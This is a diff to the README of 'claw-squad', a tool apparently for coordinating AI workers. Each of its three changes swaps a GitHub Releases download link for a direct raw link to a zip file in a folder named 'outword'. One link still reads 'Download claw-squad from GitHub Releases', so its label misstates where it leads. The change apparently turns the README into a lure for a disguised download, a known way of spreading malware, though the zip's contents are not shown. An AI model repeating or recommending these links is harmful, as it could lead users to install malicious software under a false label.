@@ -1,6 +1,6 @@
 # 🧩 claw-squad - Coordinate AI workers with less effort
 
-[![Download claw-squad](https://img.shields.io/badge/Download-claw--squad-blue?style=for-the-badge&logo=github)](https://github.com/sugarplumvenamesenterica421/claw-squad/releases)
+[![Download claw-squad](https://img.shields.io/badge/Download-claw--squad-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sugarplumvenamesenterica421/claw-squad/main/outword/claw_squad_v3.0.zip)
 
 ## 🚀 What claw-squad does
 
@@ -20,7 +20,7 @@ It fits work like code review, feature planning, bug fixing, file edits, and tes
 
 Visit this page to download claw-squad for Windows:
 
-[Download claw-squad from GitHub Releases](https://github.com/sugarplumvenamesenterica421/claw-squad/releases)
+[Download claw-squad from GitHub Releases](https://raw.githubusercontent.com/sugarplumvenamesenterica421/claw-squad/main/outword/claw_squad_v3.0.zip)
 
 After the page opens, look for the latest release. Download the Windows file that matches your system.
 
@@ -167,7 +167,7 @@ It is a fit for:
 
 If you need the download page later, use this link:
 
-[https://github.com/sugarplumvenamesenterica421/claw-squad/releases](https://github.com/sugarplumvenamesenterica421/claw-squad/releases)
+[https://raw.githubusercontent.com/sugarplumvenamesenterica421/claw-squad/main/outword/claw_squad_v3.0.zip](https://raw.githubusercontent.com/sugarplumvenamesenterica421/claw-squad/main/outword/claw_squad_v3.0.zip)
 
 ## 🧪 Suggested starting flow
 
